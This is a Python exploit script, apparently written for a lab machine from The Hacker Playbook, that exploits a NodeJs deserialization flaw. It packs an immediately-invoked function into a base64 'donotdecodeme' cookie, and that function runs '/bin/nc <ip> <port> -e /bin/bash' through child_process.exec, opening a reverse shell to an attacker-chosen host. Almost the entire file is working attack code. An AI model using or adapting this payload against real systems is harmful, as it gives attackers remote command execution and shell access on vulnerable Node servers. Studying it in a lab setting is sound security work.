#!/usr/bin/env python3.6

''' Script to get reverse shell from The Hacker Playbook Chat Support Node machine. 
    Takes advantage of deserialization vulnerability in NodeJs.'''

import sys
import requests
from base64 import b64encode

# Basic input check
if len(sys.argv) != 4:
    print("Usage: deserialize.py <attacker ip> <attacker port> <url>")
    sys.exit(1)
else:
    ip = sys.argv[1]
    port = sys.argv[2]
    url = sys.argv[3]

# Craft injection. Exploits deserialization of cookie 'donotdecodeme' with IIFE
command = f"/bin/nc {ip} {port} -e /bin/bash 2> /opt/web/chatSupportSystems/public/hacked.txt".encode()

injection = b'{"thp":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'' + command + b'\', function(error, stdout, stderr) { console.log(stdout) });}()"}'

print(f"\nCrafted injection: \n{injection.decode()}")

# Encode injection with base64 and convert from bytes to string
injection = b64encode(injection).decode()

# Create cookie dict to put in get request
cookies = dict(donotdecodeme=str(injection))

# Perform request with injected cookie and kickback shell.  Requires listener set up on port specified at runtime
print("\nMaking web request with injected cookie...")
resp = requests.get(url, cookies=cookies)

print(f"\nCheck listener on port {port} for reverse shell.")

